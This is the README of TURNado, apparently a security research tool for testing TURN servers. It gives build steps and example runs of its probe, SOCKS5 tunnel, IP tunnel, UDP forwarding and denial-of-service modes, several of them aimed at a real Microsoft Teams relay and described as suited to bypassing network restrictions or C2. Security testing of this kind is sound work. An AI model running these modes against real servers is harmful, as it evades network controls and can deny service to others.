# 🌪️ TURNado 🦈

A TURN test suite for testing and (ab)using TURN servers.

Check out the [blog post](https://blog.syss.com/posts/turnado/)!



## Features

TURNado supports several modes to effectively test modern TURN implementations for security issues and misconfigurations.
It also supports tunneling arbitrary traffic through TURN channels, e.g., for bypassing Internet restrictions.

The following modes are implemented:

- `info`: Inspect TURN server details and probe UDP/TCP capabilities.
- `socks`: SOCKS5-over-TURN tunnel.
- `tunnel`: Full IP tunnel for tunneling arbitrary traffic through TURN.
- `forward`: UDP forwarder over TURN.
- `dos`: Create many allocations for load testing.



## Build instructions

TURNado is developed in Golang.

To build it on Linux:

```sh
$ git clone https://github.com/SySS-Research/TURNado

$ cd TURNado

$ go mod tidy

$ go build ./cmd/turnado
```

Cross-compile for Windows:

```
$ GOOS=windows GOARCH=amd64 go build ./cmd/turnado 
```



## Usage Examples and Modes

The following subsections describe the basic usage and different modes of TURNado.


### info

Probes TURN server properties.
Moreover, it tries to allocate TCP and UDP destinations (including localhost addresses) and attempts to send dummy traffic through it:

```sh
turnado info -t turn.example.com:3478 -u user -p pass

TURN server: 203.0.113.200:3478
Realm: turn.example
Software: TURNv1.3
Probe address: 203.0.113.200:3478
XOR-MAPPED-ADDRESS: 203.0.113.1:50238
Permission to 127.0.0.1 allowed: true
Permission to ::1 allowed: true
UDP permission allowed: true
UDP data send: true
TCP allocation allowed: false (error: Allocate error response (error 442: Unsupported Transport Protocol))
```

If no credentials are submitted, the external permission/data probe is skipped.


### socks

The `socks` mode allows tunneling TCP traffic encapsulated within a custom protocol over TURN and through an exit node via a SOCKS proxy.
This could be used e.g. for bypassing outgoing Internet restrictions or for C2 communication.

1. Start the `socks` mode on the client you want to have the SOCKS proxy listen on:

```sh
$ turnado socks -t worldaz-msit.relay.teams.microsoft.com:443 -T tls -u <username> -p <password> -E
2026/02/06 12:59:30.526128 TURN UDP relay allocated at: 52.114.237.180:51601
Connection string:
eyJ2IjoxL[...]
2026/02/06 12:59:30.526475 SOCKS5 listening on 127.0.0.1:1080
2026/02/06 12:59:30.526485 Waiting for peer connection string on stdin (paste it and press Enter) ...
```

2. Copy the base64-encoded connection string and use it to start the `socks` mode on the exit node:

```sh
$ turnado socks -c eyJ2IjoxL[...]
2026/02/06 13:01:12.355942 TURN UDP relay allocated at: 52.114.251.48:51486
2026/02/06 13:01:12.421888 Permission created for peer 52.114.237.180:51601
Connection string:
eyJ2IjoxL[...]
2026/02/06 13:01:12.786007 Exit role active: accepting OPEN over TURN.

```

3. Copy the connection string generated on the exit node and paste it into the client:

```
$ turnado socks -t worldaz-msit.relay.teams.microsoft.com:443 -T tls -u <username> -p <password> -E
2026/02/06 12:59:30.526128 TURN UDP relay allocated at: 52.114.237.180:51601
Connection string:
eyJ2IjoxL[...]
2026/02/06 12:59:30.526475 SOCKS5 listening on 127.0.0.1:1080
2026/02/06 12:59:30.526485 Waiting for peer connection string on stdin (paste it and press Enter) ...
eyJ2IjoxL[...]
2026/02/06 13:02:03.710369 Paired! Permission created for peer 52.114.251.48:51486
```

4. Now, the local SOCKS proxy on the client can be used to tunnel communication through TURN to the exit node (e.g. to the Internet):

```sh
$ curl -x socks5://127.0.0.1:1080 http://example.com | html2text

****** Example Domain ******
This domain is for use in documentation examples without needing permission.
Avoid use in operations.
Learn more
```

Adding the `-E/--encrypt` parameter is recommended to enable additional encryption with AES-CTR on the transport layer.



### tunnel

The `tunnel` mode extends the custom encapsulation protocol of the `socks` mode to use it in combination with full layer 3 IP tunneling and packet fragmentation.
This way, high throughput can be achieved when tunneling arbitrary UDP and TCP traffic similar to a VPN:

1. Start the tunnel on the client side:

```sh
$ sudo turnado tunnel -t worldaz-msit.relay.teams.microsoft.com:443 -T tls -u <username> -p <password> -E
2026/02/06 13:13:46.229394 TURN UDP relay allocated at: 52.112.213.49:52523
Connection string:
eyJ2IjoxL[...]
2026/02/06 13:13:46.230802 TUN device opened: turn0
```

2. Copy the connection string and use it to start the exit node tunnel:

```sh
$ sudo turnado tunnel -c eyJ2IjoxL[...]
2026/02/06 13:14:58.522896 TURN UDP relay allocated at: 52.112.213.45:51315
2026/02/06 13:14:58.539115 Permission created for peer 52.112.213.49:52523
Connection string:
eyJ2IjoxL[...]
2026/02/06 13:14:58.857267 Exit role active: accepting IP packets over TURN.
2026/02/06 13:14:58.859120 TUN device opened: turn0
```

3. Copy the connection string generated by the exit node and paste it into the client:

```sh
$ sudo turnado tunnel -t worldaz-msit.relay.teams.microsoft.com:443 -T tls -u <username> -p <password> -E
2026/02/06 13:13:46.229394 TURN UDP relay allocated at: 52.112.213.49:52523
Connection string:
eyJ2IjoxL[...]
2026/02/06 13:13:46.230802 TUN device opened: turn0
eyJ2IjoxL[...]
2026/02/06 13:15:42.941983 Paired! Permission created for peer 52.112.213.45:51315

```

4. Now, a virtual IP interface is created on both ends which can be used as usual:

```sh
$ ip -brief addr show dev turn0
turn0            UNKNOWN        10.0.1.2/24

$ ping 10.0.1.1 -c 4
PING 10.0.1.1 (10.0.1.1) 56(84) bytes of data.
64 bytes from 10.0.1.1: icmp_seq=1 ttl=64 time=68.3 ms
64 bytes from 10.0.1.1: icmp_seq=2 ttl=64 time=68.9 ms
64 bytes from 10.0.1.1: icmp_seq=3 ttl=64 time=71.7 ms
64 bytes from 10.0.1.1: icmp_seq=4 ttl=64 time=65.3 ms

--- 10.0.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 65.308/68.560/71.726/2.278 ms

$ sudo ip route add 1.1.1.1 via 10.0.1.1 dev turn0

$ traceroute 1.1.1.1
traceroute to 1.1.1.1 (1.1.1.1), 30 hops max, 60 byte packets
 1  10.0.1.1 (10.0.1.1)  71.865 ms  71.858 ms  71.848 ms
    [...]
10  one.one.one.one (1.1.1.1)  74.671 ms  74.664 ms  74.670 ms
```

To effectively route traffic through the exit node, IP forwarding and NAT settings should be made, e.g.:

```sh
$ sudo sysctl -w net.ipv4.ip_forward=1

$ sudo iptables -t nat -A POSTROUTING -s 10.0.1.2 -o eth0 -j MASQUERADE
```

As with the `socks` mode, it is recommended to use the `-E/--encrypt` parameter for additional encryption.


### forward

The `forward` mode allows blind UDP forwarding over TURN.
Therefore, a peer address must be supplied for which a UDP allocation and permissions are requested on the TURN server.
After successful allocation, arbitrary UDP traffic can be sent through the TURN server via a local listener created by TURNado:


1. Start the `forward` mode and supply a peer on which the data to be sent:

```sh
$ turnado forward -t worldaz-msit.relay.teams.microsoft.com:443 -T tls -u <username> -p <password> -P ipinfo.io:443
2026/02/06 13:25:29.227356 Forward listening on 0.0.0.0:9999, forwarding via TURN to 34.117.59.81:443
```

2. Send UDP traffic, e.g., HTTP/3 (QUIC) via the local listener through the TURN server:

```sh
$ curl --http3-only --connect-to ipinfo.io:443:127.0.0.1:9999 https://ipinfo.io/
{
  "ip": "52.114.237.168",
  "city": "Gävle",
  "region": "Gävleborg",
  "country": "SE",
  "loc": "60.6745,17.1417",
  "org": "AS8075 Microsoft Corporation",
  "postal": "800 02",
  "timezone": "Europe/Stockholm",
  "readme": "https://ipinfo.io/missingauth"
}
```


### dos

The `dos` mode creates as many allocations as specified within the `-s/--sessions` parameter.
Since possible relayed address pairs are finite due to port exhaustion on the TURN server, this could cause a denial of service of the TURN service:

```sh
$ turnado dos -t <turnserver> -u <username> -p <password> -s 10000

    [...]

2026/01/30 10:25:57.216069 [session 3413] allocate failed: all retransmissions failed for J/4JdOaPqaazJbB1
2026/01/30 10:25:57.218983 [session 3933] allocate failed: all retransmissions failed for ncDklprMUn2ZZIw1
2026/01/30 10:25:57.220065 [session 3545] allocate failed: all retransmissions failed for AGpSwfIc7wbkVMuM
2026/01/30 10:25:57.220080 Active allocations: 3917/10000. Press Ctrl+C to close.
```

As shown above, only 3917 allocations were made successfully before the TURN service went into a denial of service state.

**USE THIS MODE WITH CAUTION!**



## Blog Post

For more information on how to use it, common TURN pitfalls, and countermeasures, check out the [blog post](https://blog.syss.com/posts/turnado/)!



## Disclaimer

Use responsibly and only with permission from all relevant parties.
This toolkit is intended for **educational** and **research** purposes only.
